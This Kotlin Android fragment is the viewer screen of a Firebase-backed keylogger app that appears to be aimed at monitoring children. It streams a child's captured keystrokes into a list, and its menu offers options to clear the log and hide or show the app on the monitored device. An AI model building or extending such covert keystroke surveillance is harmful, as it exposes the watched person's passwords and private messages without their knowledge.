package com.sm.sdt.firebasekeyloggerandroird.ui.Fragment.child

import android.content.Context
import android.os.Bundle
import android.util.Log
import android.view.*
import android.widget.Toast
import androidx.fragment.app.Fragment
import androidx.navigation.fragment.findNavController
import androidx.navigation.fragment.navArgs
import androidx.recyclerview.widget.LinearLayoutManager
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.sm.sdt.firebasekeyloggerandroird.Consts
import com.sm.sdt.firebasekeyloggerandroird.Consts.KEYLOG_DATA
import com.sm.sdt.firebasekeyloggerandroird.Consts.TAG
import com.sm.sdt.firebasekeyloggerandroird.Consts.USER_REFRENCE
import com.sm.sdt.firebasekeyloggerandroird.Consts.firebaseAuth
import com.sm.sdt.firebasekeyloggerandroird.Consts.firebaseDatabase
import com.sm.sdt.firebasekeyloggerandroird.R
import com.sm.sdt.firebasekeyloggerandroird.databinding.FragmentChildKeylogBinding
import com.sm.sdt.firebasekeyloggerandroird.ui.adapter.keylogAdapter
import java.util.*


class ChildKeylogFragment : Fragment(R.layout.fragment__child_keylog) {

    var _binding: FragmentChildKeylogBinding? = null
    val binding get() = _binding!!
    lateinit var dataRef: DatabaseReference

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentChildKeylogBinding.inflate(inflater, container, false)
        val view = binding.root
        return view

    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        binding.progressBarKeylog.visibility = View.VISIBLE
        activity?.setTitle("Keylog")
        val navArgs: ChildKeylogFragmentArgs by navArgs()

        val uid = firebaseAuth.currentUser!!.uid

        setHasOptionsMenu(true)
        val list = ArrayList<String>()
        dataRef = firebaseDatabase.getReference(USER_REFRENCE)
            .child(uid)
            .child(navArgs.childName)
            .child(KEYLOG_DATA)

        val layoutManager = LinearLayoutManager(requireContext())
        layoutManager.stackFromEnd = false
        binding.recyclerView.layoutManager = layoutManager
        val recyclerView = binding.recyclerView
        recyclerView.adapter = keylogAdapter(list)
        val adapter = recyclerView.adapter
        recyclerView.setHasFixedSize(true)


//        dataRef.addValueEventListener(object : ValueEventListener {
//
//
//            override fun onDataChange(snapshot: DataSnapshot) {
//                snapshot.children.forEach {
//                    list.add(it.getValue().toString())
//                }
//                list.reverse()
//                recyclerView.adapter = keylogAdapter(list)
//            }
//
//            override fun onCancelled(error: DatabaseError) {
//                TODO("Not yet implemented")
//            }
//        })


        dataRef.addChildEventListener(object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                binding.progressBarKeylog.visibility = View.INVISIBLE
                snapshot.children.forEach {
                    list.add(0, it.value.toString())
                    adapter!!.notifyItemInserted(0);
                    recyclerView.scrollToPosition(0);

                }


            }

            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                snapshot.children.forEach {
                    list.add(it.value.toString())
                    adapter?.notifyDataSetChanged()
                }

            }

            override fun onChildRemoved(snapshot: DataSnapshot) {
                snapshot.children.forEach {
                    list.remove(it.value.toString())
                    adapter?.notifyDataSetChanged()
                }
            }

            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {

            }

            override fun onCancelled(error: DatabaseError) {
                TODO("Not yet implemented")
            }

        })

    }

    override fun onCreateOptionsMenu(menu: Menu, inflater: MenuInflater) {
        inflater.inflate(R.menu.keylog_menu, menu)
        super.onCreateOptionsMenu(menu, inflater)
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {

        var parentUid = ""
        if (firebaseAuth.currentUser != null) {
            parentUid = Consts.firebaseAuth.currentUser!!.uid
        }
        val sharedPreferences =
            context?.getSharedPreferences(Consts.PREFERENCE_NAME, Context.MODE_PRIVATE)
        val childName = sharedPreferences?.getString(Consts.CHILD_NAME_KEY, "")
        val userRef = firebaseDatabase.getReference(USER_REFRENCE)

        when (item.itemId) {
            R.id.logout -> {
                firebaseAuth.signOut()
                findNavController().navigate(ChildKeylogFragmentDirections.actionChildKeylogFragmentToParentLoginFragment())
                Toast.makeText(activity, "You are logged out", Toast.LENGTH_SHORT).show()
            }
            R.id.clear_keylog -> dataRef.removeValue()
            R.id.hide_app_menu -> {

                userRef.child(parentUid).child(childName.toString()).child(
                    Consts.ACCOUNT_DATA
                ).child(Consts.IS_HIDDEN)
                    .setValue(1)
            }
            R.id.show_app_menu -> {

                userRef.child(parentUid).child(childName.toString()).child(
                    Consts.ACCOUNT_DATA
                ).child(Consts.IS_HIDDEN)
                    .setValue(0)
            }

        }
        return super.onOptionsItemSelected(item)

    }
}




